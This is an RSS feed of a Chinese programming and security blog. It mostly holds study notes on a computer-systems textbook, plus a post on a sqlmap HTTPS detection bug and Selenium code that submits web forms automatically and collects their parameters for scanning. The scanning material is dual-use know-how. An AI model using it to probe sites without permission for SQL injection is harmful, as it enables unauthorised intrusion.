<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="https://www.w3.org/2005/Atom">
  <channel>
    <title>quanyechavshuo</title>
    <description>A blog about programming and network security</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Mon, 11 Sep 2017 17:26:41 +0800</pubDate>
    <lastBuildDate>Mon, 11 Sep 2017 17:26:41 +0800</lastBuildDate>
    <generator>Jekyll v3.4.2</generator>
    
      <item>
        <title>深入理解计算机系统第7章笔记</title>
        <description>&lt;h3 id=&quot;链接&quot;&gt;链接&lt;/h3&gt;

&lt;p&gt;1.为了构造可执行文件,链接器必须完成两个主要任务&lt;/p&gt;

&lt;p&gt;a)符号解析:符号解析的目的是将每个符号引用刚好和一个符号定义联系起来&lt;/p&gt;

&lt;p&gt;b)重定位:链接器通过把每个符号定义与一个存储器位置联系起来,然后修改所有对这些符号的引用,使得它们指向这个存储器位置
,从而重定位这些节&lt;/p&gt;

&lt;p&gt;2.如下为一个典型的ELF可重定位目标文件格式
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/csapp7-1.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.text:已编译程序的机器码
.rodata:只读数据,如printf语句中的格式串和开关语句的跳转表
.data:已初始化的全局变量,局部变量保存在栈中
.bss:未初始化的全局变量,在目标文件中这个节不占据实际的空间,它仅仅是一个点位符(better save space)
.symtab:一个符号表,它存放程序中定义和引用的函数和全局变量的信息,.symtab符号表不包含局部变量的条目
.rel.text:一个.text节中位置的列表,当链接器把这个目标文件和其他文件结合时,需要修改这些位置
.rel.data:被模块引用或定义的任何全局变量的重定位信息
.debug:一个调试符号表,其条目是程序中定义的局部变量和类型定义,程序中定义和引用的全局变量,以及原始的C源文件,只有-g
选项调用编译驱动程序(gcc)才会得到这张表
.line:源代码和.text节中机器指令之间的映射
.strtab:一个字符串表,其内容包括.symtab和.debug节中的符号表,以及节头部中的节名字,也即反汇编中&quot;查找字符串&quot;的结果
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;3.符号:符号是函数名和变量名,本地链接器符号不包含对应于本地非静态程序变量的任何符号(局部变量)&lt;/p&gt;

&lt;p&gt;4.定义为带有C static属性的本地过程变量是不在栈中管理的,相反,编译器在.data和.bss中为每个定义分配空间,并在符号表中
创建一个有唯一名字的本地链接器符号&lt;/p&gt;

&lt;p&gt;5.任何声明带有static属性的全局变量或者函数都是模块私有有,类似地,任何声明不带static属性的全局变量和函数都是公共的,
可以被其他模块访问,使用static属性可在模块内部隐藏变量和函数声明,尽可能用static属性来保护你的变量和函数是很好的编
程习惯.python中在名称前加下划线表示私有,&lt;a href=&quot;http://python.jobbole.com/81129/&quot;&gt;更多详情&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Fri, 08 Sep 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/auxilary/2017/09/08/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%AC%AC7%E7%AB%A0%E7%AC%94%E8%AE%B0/</link>
        <guid isPermaLink="true">http://localhost:4000/auxilary/2017/09/08/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%AC%AC7%E7%AB%A0%E7%AC%94%E8%AE%B0/</guid>
        
        <category>csapp</category>
        
        
        <category>auxilary</category>
        
      </item>
    
      <item>
        <title>深入理解计算机系统第6章笔记</title>
        <description>&lt;h3 id=&quot;存储器层次结构&quot;&gt;存储器层次结构&lt;/h3&gt;

&lt;p&gt;1.高速缓存介于cpu和主存(内存)之间,它们对于应用程序性能的影响最大&lt;/p&gt;

&lt;p&gt;2.在简单模型中,存储器系统是一个线性的字节数组,而cpu能够在一个常数时间内访问每个存储器位置,虽然迄今为止这都是一个
有效的模型,但是它没有反映现代系统实际工作的方式&lt;/p&gt;

&lt;p&gt;3.cpu是中央处理器(central processing unit),主要由运算器,控制器,寄存器三部分组成&lt;/p&gt;

&lt;p&gt;4.sram(static random-access memory):静态随机访问存储器主要用于作高速缓存存储器;dram(dynamic random-access
memory):动态随机访问存储器主要用于作主存(内存);rom(read-only memory):只读存储器;sram和dram断电后内容消失&lt;/p&gt;

&lt;p&gt;5.总线分为:系统总线,存储器总线,I/O总线.虽然I/O总线比系统总线和存储器总线慢,但是它可以容纳种类繁多的第三方I/O设备&lt;/p&gt;

&lt;p&gt;6.dma(direct memory access):直接存储器访问.在磁盘控制器收到来自cpu的读命令后,它将逻辑块号翻译成一个扇区地址,读该
扇区的内容,然后将这些内容直接传送到主存,不需要cpu的干涉.设备可自己执行读或写总线事务,这个过程称为dma(发生在将硬盘
中的数据读到内存中,这个命令是cpu发出的)&lt;/p&gt;

&lt;p&gt;7.局部性原理:一个编写良好的程序倾向于引用邻近于其他最近引用过的数据项,或者最近引用过的数据项本身,这是一个持久的概
念,对硬件和软件系统的设计和性能都有着极大的影响.局部性有两种不同的形式:时间局部性和空间局部性.在一个具有良好时间
局部性的程序中,被引用过一次的存储器位置很可能在不远的将来再被多次引用;在一个具有良好空间局部性的程序中,如果一个存
储器位置被引用了一次,那么程序很可能在不远的将来引用附近的一个存储器位置&lt;/p&gt;

&lt;p&gt;8.局部性小结&lt;/p&gt;

&lt;p&gt;a)重复引用同一个变量的程序有良好的时间局部性&lt;br /&gt;
b)对于具有步长为k的引用模式的程序,步长越小,空间局部性越好&lt;br /&gt;
c)对于取指令来说,循环有好的时间和空间局部性,循环体越小,循环迭代次数越多,局部性越好&lt;br /&gt;
d)二维C数组在存储器中是按照行顺序来存放的,对a[i][j]表示每个元素中:&lt;code class=&quot;highlighter-rouge&quot;&gt;for(i=0;j&amp;lt;n;i++)-&amp;gt;for(j=0;j&amp;lt;n;j++)&lt;/code&gt;的空间局部性
比&lt;code class=&quot;highlighter-rouge&quot;&gt;for(j=0;j&amp;lt;n;j++)-&amp;gt;for(i=0;i&amp;lt;n;i++)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;9.缓存命中:当程序需要第k+1层的某个数据对象d时,它首先在当前存储在第k层的一个块中查找d,如果d刚好缓存在第k层中,那么
这就是缓存命中&lt;/p&gt;

&lt;p&gt;10.存储器层次结构的本质是,每一层存储设备都是较低一层的缓存.基于缓存的存储器层次结构行之有效,是因为较慢的存储设备
比较快的存储设备更便宜,还因为程序往往展示局部性:&lt;br /&gt;
a)利用时间局部性:由于时间局部性,同一数据对象可能会被多次使用.一旦一个数据对象在第一次不命中时被拷贝到缓存中,我们
就会期望后面对该目标有一系列的访问命中&lt;br /&gt;
b)利用空间局部性:块通常包含有多个数据对象,由于空间局部性,我们会期望后面对该块中其他对象的访问能够补偿不命中的拷贝
该块的花费&lt;/p&gt;

&lt;p&gt;11.高速缓存读写过程&lt;/p&gt;

&lt;p&gt;a)读:首先,在高速缓存中查找所需字w的拷贝.如果命中,立即返回字w给cpu,如果不命中,从存储器层次结构中较低层中取出包含字
w的块,将这个块存储到某个高速缓存行中(可能会驱逐一个有效的行),然后返回字w&lt;/p&gt;

&lt;p&gt;b)写:写的情况复杂一些,假设要写一个已经缓存了的字w,有2种方法:一种是直写,就是立即将w的高速缓存块写回到紧接着的低一
层中,虽然简单,但是直写的缺点是每次写都会引起总线流量.另一种方法称为写回,尽可能地推迟存储器更新,只有当替换算法要驱
逐更新过的块时,才把它写到紧接着的低一层中.&lt;/p&gt;

&lt;p&gt;12.确保代码高速缓存友好的基本方法&lt;/p&gt;

&lt;p&gt;a)让最常见的情况运行得快,也即要把注意力集中在核心函数中的循环上而忽略其他部分&lt;/p&gt;

&lt;p&gt;b)在每个循环内部缓存不命中数量最小,也即保证有好的时间局部性(对局部变量的反复引用)和空间局部性(步长为1的引用模式)&lt;/p&gt;

&lt;p&gt;13.关于存储器山&lt;/p&gt;

&lt;p&gt;a)一个程序从存储系统中读数据的速率称为读吞吐量(或读带宽)&lt;br /&gt;
b)读带宽的时间和空间局部性的二维函数称为存储器山&lt;br /&gt;
c)即使是当程序的时间局部性很差时,空间局部性仍然能补救,并且是非常重要的
d)存储器系统的性能不是一个数字就能描述的,相反,它是一座时间和空间局部性的山,这座山的上升调试差别可以超过一个数量级&lt;br /&gt;
e)要使程序运行在存储器的山峰,就是要利用时间局部性,使得频繁使用的字从L1(最快的高速缓存)中取出,还要利用空间局部性,
使得尽可能多的字从一个L1高速缓存行中访问到&lt;/p&gt;
</description>
        <pubDate>Tue, 05 Sep 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/auxilary/2017/09/05/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%AC%AC6%E7%AB%A0%E7%AC%94%E8%AE%B0/</link>
        <guid isPermaLink="true">http://localhost:4000/auxilary/2017/09/05/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%AC%AC6%E7%AB%A0%E7%AC%94%E8%AE%B0/</guid>
        
        <category>csapp</category>
        
        
        <category>auxilary</category>
        
      </item>
    
      <item>
        <title>深入理解计算机系统第5章笔记</title>
        <description>&lt;h3 id=&quot;优化程序性能&quot;&gt;优化程序性能&lt;/h3&gt;

&lt;p&gt;1.编写高效程序特点:&lt;/p&gt;

&lt;p&gt;a)必须选择一组合适的算法和数据结构&lt;br /&gt;
要特别警觉,避免使用那些会渐进地产生糟糕性能的算法或编码技术&lt;/p&gt;

&lt;p&gt;b)必须编写出编译器能够有效优化以转换成高效可执行代码的源代码&lt;br /&gt;
如,用好的风格重写条件操作,使得编译采用条件数据传送&lt;/p&gt;

&lt;p&gt;c)利用多核和多处理器并行计算&lt;br /&gt;
通过使用例如多个累积变量和重新结合等技术,找到方法提高指令级并行&lt;/p&gt;

&lt;p&gt;d)消除循环的低效率&lt;br /&gt;
展开循环,降低开销,并且使得进一步的优化成为可能&lt;/p&gt;

&lt;p&gt;e)减少过程调用&lt;br /&gt;
消除连续的函数调用,在可能时,将计算移到循环外,考虑有选择地妥协程序的模块性以获得更大的效率&lt;/p&gt;

&lt;p&gt;f)消除不必要的存储器引用&lt;br /&gt;
引入临时变量来保存中间结果,只有在最后的值计算出来时,才将结果存放到数组或全局变量中&lt;/p&gt;

&lt;p&gt;2.现代微处理器取得的了不起的功绩之一是:它们采用复杂而奇异的微处理器结构,其中,多条指令可以并行地执行,同时又呈现一
种简单地顺序执行的表象&lt;/p&gt;

&lt;p&gt;3.现代微处理器可以在每个时钟周期执行多个操作,而且是乱序的,意思就是指令执行的顺序不一定要与它们在机器程序中的顺序
一致,与第4章研究过的流水线相比,乱序处理器需要更大更复杂的硬件,但是它们能更好地达到更高的指令级并行度&lt;/p&gt;

&lt;p&gt;4.通常指令控制单元(ICU)会在当前正在执行的指令很早之前取指,这样它才有足够的时间对指令译码,并把操作发送到执行单元
(EU).不过,当程序遇到分支(jnz/retn等)时,程序有两个可能的前进方向,现代处理器采用了一种称为分支预测的技术,处理器会猜
测是否会选择分支并取指和译码,如果后来发现选错了,会将状态重新设置到分支点的状态,并取指和译码&lt;/p&gt;

&lt;p&gt;5.循环展开是一种程序变换,通过增加每次迭代计算的元素的数量,减少循环的迭代次数.编译器可以很容易地执行循环展开,只要
优化级别设置得足够高,许多编译器都能例行公事地做到这一点.用命令行选项”-funroll-loops”调用GCC,会执行循环展开.&lt;/p&gt;

&lt;p&gt;循环展开能够从两个方面改程序的性能,下图中psum2函数是一个循环展开的示例.&lt;/p&gt;

&lt;p&gt;a)减少了不利操作的数量,如:循环索引计算和条件分支&lt;br /&gt;
b)提供了一些方法,可以进一步变化代码,减少整个计算中关键路径上的操作数量&lt;br /&gt;
c)编译器可以很容易地执行循环展开,只要优化级别设置得足够高,许多编译器都能例行公事地做到这一点&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/csapp5-1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;6.每个运算都是由两个周期计数值来刻画的:一个是延迟,它表示完成运算所需要的总时间;另一个是发射时间,它表示两个连续的
同类型运算之间需要的最小时钟周期数.&lt;/p&gt;

&lt;p&gt;7.提高并行性&lt;/p&gt;

&lt;p&gt;a)多个累积变量&lt;br /&gt;
对于一个可结合和可交换的合并运算来说,比如说整数加法或乘法,我们可以通过将一组合并运算分割成两个或更多的部分,并在
最后合并结果来提高性能(利用功能单元的流水线能力来提高性能)&lt;/p&gt;

&lt;p&gt;b)重新结合变换&lt;br /&gt;
重新结合变换能够减少计算中关键路径上操作的数量,通过更好地利用功能单元的流水线能力得到更好的性能&lt;/p&gt;

&lt;p&gt;8.unix系统提供了一个剖析程序GPROF,它会计算每个函数花费的时间和函数被调用的次数&lt;/p&gt;

&lt;p&gt;9.为什么函数调用和递归效率低?&lt;/p&gt;

&lt;p&gt;系统每次函数调用都要分配存储空间,并将调用点压栈记录,在函数调用结束后还要释放空间,恢复栈空间,所以函数调用浪费时间
和空间,而递归正是函数自己调用自己,于是效率低&lt;/p&gt;

</description>
        <pubDate>Thu, 31 Aug 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/auxilary/2017/08/31/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%AC%AC5%E7%AB%A0%E7%AC%94%E8%AE%B0/</link>
        <guid isPermaLink="true">http://localhost:4000/auxilary/2017/08/31/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%AC%AC5%E7%AB%A0%E7%AC%94%E8%AE%B0/</guid>
        
        <category>csapp</category>
        
        
        <category>auxilary</category>
        
      </item>
    
      <item>
        <title>深入理解计算机系统第4章笔记</title>
        <description>&lt;h3 id=&quot;处理器体系结构&quot;&gt;处理器体系结构&lt;/h3&gt;

&lt;p&gt;1.ISA:指令集体系结构,是指一个处理器支持的指令和指令的字节级编码&lt;/p&gt;

&lt;p&gt;2.ISA在编译器编写者和处理器设计人员之间提供了一个概念抽象层,编译器编写者只需要知道允许哪些指令,以及它们是如何编码
的;而处理器设计者必须建造出执行这些指令的处理器&lt;/p&gt;

&lt;p&gt;3.ISA模型看上去应该是顺序指令执行,也就是先取出一条指令,等到它执行完毕,再开始下一条.然而,与一个时刻只执行一条指令
相比,通过同时处理金条指令的不同部分,处理器可以获得较高的性能(流水线),为了保证处理器能达到同顺序执行相同的结果,人
们采用了一些特殊的机制&lt;/p&gt;

&lt;p&gt;4.生产处理器的公司很少,但是研究处理器的设计人员的队伍已经非常巨大了,而且还在增大.一个主要的处理器设计的各个方面大
约涉及1000多人&lt;/p&gt;

&lt;p&gt;5.HCL:硬件控制语言,是一种描述硬件系统控制部分的简单语言&lt;/p&gt;

&lt;p&gt;6.基于顺序操作的功能正确但是有点不实用的Y86处理器是作者用的例子,基于这个顺序设计为基础,进行一系列的改造,创建一个
流水线化的处理器,这个流水线化的处理器将每条指令的执行分解成五步,处理器可以同时执行五条指令的不同阶段,为了使这个处
理器保留Y86 ISA的顺序的性质,要求处理很多冒险或冲突情况,冒险就是一条指令的位置或操作数信赖于其他仍在流水线中的指令&lt;/p&gt;

&lt;p&gt;7.指令集的一个重要性质就是字节编码必须有唯一的解释,任意一个字节序列要么是一个唯一的指令序列的编码,要么就不是一个
合法的字节序列&lt;/p&gt;

&lt;p&gt;8.通过将逻辑门组合成大的网,可以构造出能计算更加复杂函数的组合电路.算术/逻辑单元(ALU)是一种很重要的组合电路&lt;/p&gt;

&lt;p&gt;9.cpu的时钟频率也即工作频率,一般来说,一个时钟周期内完成的指令数是固定的,所以时钟频率越高,cpu的速度也就越快了,为什
么要有时钟可参考”通俗易懂的例子,好吧,分析一下抬轿子,八抬大轿,轿夫要一起用力,用力的方向和时间需一致,移轿中每
人的行进方向和速率也要一致,轿夫头负责喊号子,他的行动和速度是其它七个人的参照基点,这个轿夫头在某种意义上就是时
钟,没有这个轿夫头,八个人各行其事,轿子是无法到达目的地的,甚至都不能被抬离地面.” 4G的处理器表示这个处理器的时钟运行
频率是4GHz&lt;/p&gt;

&lt;p&gt;10.时钟寄存器存储单个位或字.时钟信号控制寄存器加载输入值.时钟信号上升时,输出=输入,时钟信号未上升时,输出=当前状态&lt;/p&gt;

&lt;p&gt;11.SEQ(“sequential”顺序的)处理器:每个时钟周期上,SEQ执行处理一条完整指令所有步骤.SEQ唯一的问题就是它太慢了.时钟必
须非常慢,以使信号能在一个周期内传播所有的阶段.SEQ的实现包括组合逻辑和两种存储器设备:时钟寄存器(程序计数器和条件码
寄存器),随机访问存储器(寄存器文件,指令存储器和数据存储器).组合逻辑不需要任何时序或控制——只要输入变化了,值就通
过逻辑门网络传播.SEQ这种方法不能充分利用硬件单元,因为每个单元只在整个时钟周期的一部分时间内才被使用,使用流水线可
获得更好的性能,流水线化的一个重要特性就是增加了系统的吞量,也就是单位时间内服务的顾客总数.&lt;/p&gt;

&lt;p&gt;12.指令的字节级编码如下图4-3,每条指令需要1-6个字节不等,每条指令的第一个字节表明指令的类型,这个字节分为两个部分:高
4位和低4位,高4位是代码(code)部分,低4位是功能(function)部分.如下图4-2中,代码值为0-0xB,功能值只有在一组相关指令共用
一个代码时才有用.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/csapp4-1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/csapp4-2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;13.实现所有Y86指令所需要的计算可以组织成六个阶段:取指,译码,执行,访存,写回,更新pc.
取指:从程序计数器(PC)中读取指令指示符字节的两个四位部分,称为icode(指令代码)和ifun(指令功能)
译码:从寄存器文件读入最多两个操作数,得到值valA和/或valB.
执行:算术/逻辑单元(ALU)要么执行指令指明的操作(根据ifun的值),计算存储器引用的有效地址,要么增加或减少栈指针.得到的
值称为valE
访存:将数据写入存储器或从存储器读出数据,读出的值为valM
写回:最多可以写两个结果到寄存器文件
更新PC:将PC设置成下一条指令的地址&lt;/p&gt;

&lt;p&gt;如下图4-18是对OP1(整数和逻辑运算),rrmov1(寄存器-寄存器传送)和irmov1(立即数-寄存器传送)类型的指令所需的处理&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/csapp4-3.png&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Tue, 29 Aug 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/auxilary/2017/08/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%AC%AC4%E7%AB%A0%E7%AC%94%E8%AE%B0/</link>
        <guid isPermaLink="true">http://localhost:4000/auxilary/2017/08/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%AC%AC4%E7%AB%A0%E7%AC%94%E8%AE%B0/</guid>
        
        <category>csapp</category>
        
        
        <category>auxilary</category>
        
      </item>
    
      <item>
        <title>sqlmap以加载请求文件方式检测https服务器时存在的bug</title>
        <description>&lt;h3 id=&quot;about&quot;&gt;About&lt;/h3&gt;

&lt;p&gt;sqlmap在扫描https类型的注入点的时候,当通过使用-r参数加载请求文件来检测有没有sql注入漏洞时,不能较好处理是否用ssl
通信,导致无法通过使用-r参数通过加载请求文件的方式自动检测是否是https协议,并因此无法检测出存在的注入点(需要人工添
加&lt;code class=&quot;highlighter-rouge&quot;&gt;--force-ssl&lt;/code&gt;)&lt;/p&gt;

&lt;h3 id=&quot;detail&quot;&gt;Detail&lt;/h3&gt;

&lt;p&gt;1.当requestFile(-r加载的请求文件)中有Referer参数且Referer的值中的hostname部分及port部分与requestFile中的Host参数的值
中的hostname与port部分相同,且Referer的值是https开头,认为这个requestFile的测试应该走ssl(也即走https通信)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;eg:[requestFile]

POST /xxx/xxx/xxx/x.jsp?x=a HTTP/1.1
Host: www.google.com:6666
...
Referer: https://www.google.com:6666/xxxooo/xxoo/xxx.jsp
...

xx=xxx&amp;amp;ooo=ooo
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;2.当requestFile(-r加载的请求文件)中的port值不为80且requestFile中有Referer参数且Referer的值是&lt;code class=&quot;highlighter-rouge&quot;&gt;https://.*cdn.*&lt;/code&gt;的格式,这种情况也认为要走https通信&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;eg:[requestFile]

POST /xxx/xxx/xxx/x.jsp?x=a HTTP/1.1
Host: www.google.com:6666
...
Referer: https://www.google-cdn.com/lllllllllllxxoo/xxx.jsp
...

xx=xxx&amp;amp;ooo=ooo
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;上面这种情况认为测试要走https通信,对应修改sqlmap中的lib/core/option.py中相关代码(&lt;code class=&quot;highlighter-rouge&quot;&gt;lib/core/option.py&lt;/code&gt;),已提交pull request到sqlmap,对应下面的与conf.forceSSL相关的部分代码&lt;br /&gt;
&lt;a href=&quot;https://github.com/sqlmapproject/sqlmap/pull/2663&quot;&gt;follow&lt;/a&gt;&lt;/p&gt;
</description>
        <pubDate>Wed, 23 Aug 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2017/08/23/sqlmap%E4%BB%A5%E5%8A%A0%E8%BD%BD%E8%AF%B7%E6%B1%82%E6%96%87%E4%BB%B6%E6%96%B9%E5%BC%8F%E6%A3%80%E6%B5%8Bhttps%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%97%B6%E5%AD%98%E5%9C%A8%E7%9A%84bug/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2017/08/23/sqlmap%E4%BB%A5%E5%8A%A0%E8%BD%BD%E8%AF%B7%E6%B1%82%E6%96%87%E4%BB%B6%E6%96%B9%E5%BC%8F%E6%A3%80%E6%B5%8Bhttps%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%97%B6%E5%AD%98%E5%9C%A8%E7%9A%84bug/</guid>
        
        <category>sqlmap</category>
        
        <category>https</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>selenium自动提交表单方案</title>
        <description>&lt;h3 id=&quot;0x00-refer&quot;&gt;0x00 Refer&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;http://blog.csdn.net/wang02011/article/details/6299517&quot;&gt;1.常见的提交表单的方法&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/manors/archive/2010/03/11/1683727.html&quot;&gt;2.表单提交规则&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://stackoverflow.com/questions/32779563/how-can-i-click-submit-button&quot;&gt;3.selenium提交表单&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://stackoverflow.com/questions/17530104/selenium-webdriver-submit-vs-click&quot;&gt;4.selenium中click()和submit()的区别&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;0x01-about&quot;&gt;0x01 About&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;利用selenium自动提交表单,要求能适应绝大多数的未知html情况下的提交,以便自动获取页面中的表单中的所有要提交的参
数
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x02-detail&quot;&gt;0x02 Detail&lt;/h3&gt;

&lt;p&gt;1.先判断html中form action所在行能不能通过selenium(通过查找&lt;code class=&quot;highlighter-rouge&quot;&gt;find_element_by_css_selector('form')&lt;/code&gt;)找到,不行再看看form这行有没有id或name,再通过id或name找到并用selenium的submit()来提交&lt;/p&gt;

&lt;p&gt;2.如果1失败再找&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;input.*type=('|&quot;)?submit('|&quot;)?.*&amp;gt;&lt;/code&gt;的提交按钮,找到后用selenium的click()来提交&lt;/p&gt;

&lt;p&gt;3.如果2失败再找&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;input.*type=('|&quot;)?button('|&quot;)?.*onclick=.*&amp;gt;&lt;/code&gt;的通过js提交表单的行中的按钮,找到后用selenium的
click()来提交&lt;/p&gt;

&lt;p&gt;4.目前这样做无法处理用图片提交的表单,后期视情况增加或不加&lt;/p&gt;

&lt;h3 id=&quot;0x03-code&quot;&gt;0x03 Code&lt;/h3&gt;

&lt;p&gt;目前情况看,直接通过上面第1步中的用selenium查找form可定位目前遇到的所有表单,但是由于selenium在py3下还无法直接通过
selenium对form元素的submit()调用来获得提交的post参数(get参数是可以得到的),在获取表单提交的参数时采用正则查找参数
的方式来获取,相关具体处理如下&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    if proxyUrl == &quot;&quot; or proxyUrl == 0:
        service_args_value = ['--ignore-ssl-errors=true', '--ssl-protocol=any', '--web-security=false']
    if proxyUrl != &quot;&quot; and proxyUrl != 0:
        proxyType = proxyUrl.split(&quot;:&quot;)[0]
        proxyValueWithType = proxyUrl.split(&quot;/&quot;)[-1]
        service_args_value = ['--ignore-ssl-errors=true', '--ssl-protocol=any', '--web-security=false',
                              '--proxy=%s' % proxyValueWithType, '--proxy-type=%s' % proxyType]
    # 有跳转的url最后的url如下
    # final_url=driver.current_url
    # print(&quot;正在访问的url是这个:\n&quot;+final_url)
    # driver.quit()

    try:
        from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
        if cookie != &quot;&quot;:
            dcap = dict(DesiredCapabilities.PHANTOMJS)
            dcap[&quot;phantomjs.page.settings.cookie&quot;] = cookie
            dcap[&quot;phantomjs.page.settings.userAgent&quot;] = get_random_ua()
            driver = webdriver.PhantomJS(service_args=service_args_value, desired_capabilities=dcap)
        else:
            driver = webdriver.PhantomJS(service_args=service_args_value)

        driver.implicitly_wait(10)
        driver.set_page_load_timeout(10)

        driver.get(url)
        # selenium webdriver操作cookie
        # http://www.cnblogs.com/fnng/p/3269450.html
        originalCookie = driver.get_cookies()

        import random
        # driver.get_screenshot_as_file(&quot;/tmp/PhantomJSPic&quot; +
        # get_http_domain_from_url(url).split(&quot;/&quot;)[-1] + str(random.random()))
        # selenium无法得到code,先根据返回titile和内容来看如果是正常返回,则这里将code赋值为200
        # 如果title和内容异常(如包含&quot;页面不存在&quot;),则将这个请求重新发给get_request(url,by=&quot;MechanicalSoup&quot;)
        # 这里将正常的http网页用phantomJS来请求,如果发现异常则交给MechanicalSoup重新访问
        code = 200
        title = driver.title
        content = driver.page_source
        # 表单页面处理
        try:
            form = driver.find_element_by_css_selector('form').submit()
            hasFormAction = True
            if &quot;?&quot; in driver.current_url or re.search(r'''&amp;lt;form[^&amp;lt;&amp;gt;]*method=('|&quot;)?get('|&quot;)?[^&amp;lt;&amp;gt;]*&amp;gt;''', content, re.I):
                # 说明是get请求提交的参数
                # get提交表单的处理
                formActionValue = driver.current_url
            else:
                if re.search(r'''&amp;lt;form[^&amp;lt;&amp;gt;]*method=('|&quot;)?post('|&quot;)?[^&amp;lt;&amp;gt;]*&amp;gt;''', content, re.I):
                    # post提交表单的处理采用自行查找所有表单中的参数
                    # post的测试url中有^,这是人为添加的,便于放到数据库中
                    formActionValue += (driver.current_url + &quot;^&quot;)
                else:
                    # 其他情况当作get请求,并用正则找出表单中的参数(不用selenium的submit)
                    formActionValue += (driver.current_url + &quot;?&quot;)

                inputParamList = re.findall(
                    r'''(&amp;lt;input[^&amp;lt;&amp;gt;]*name=('|&quot;)?([^'&quot;&amp;lt;&amp;gt;\s]+)('|&quot;)?[^&amp;lt;&amp;gt;]*&amp;gt;)''', content, re.I)
                paramPartValue = &quot;&quot;
                paramNameList = []
                for each in inputParamList:
                    paramName = each[2]
                    if paramName not in paramNameList:
                        # 防止有重复的参数
                        paramNameList.append(paramName)
                        if re.search(r'''type=('|&quot;)?hidden('|&quot;)?''', each[0], re.I):
                            # 处理hidden类型的参数
                            hiddenParamValue = re.search(
                                r'''value=('|&quot;)?([^'&quot;&amp;lt;&amp;gt;\s]*)('|&quot;)?''', each[0], re.I).group(2)
                            paramPartValue += (paramName + &quot;=&quot; + hiddenParamValue + &quot;&amp;amp;&quot;)
                        elif re.search(r'''required=('|&quot;)?required('|&quot;)?''', each[0], re.I):
                            # 处理必须要填的参数
                            paramPartValue += (paramName + &quot;=requiredParamValue&amp;amp;&quot;)
                        else:
                            # 处理不是hidden也不是required类的参数的处理
                            paramPartValue += (paramName + &quot;=&amp;amp;&quot;)
                if paramPartValue[-1] == &quot;&amp;amp;&quot;:
                    paramPartValue = paramPartValue[:-1]

                formActionValue += paramPartValue

        except selenium.common.exceptions.NoSuchElementException:
            hasFormAction = False
            print(&quot;没找到这个元素哟...&quot;)
        print(&quot;len content is :\n&quot; + str(len(content)))
        print(&quot;title is :\n&quot; + title)
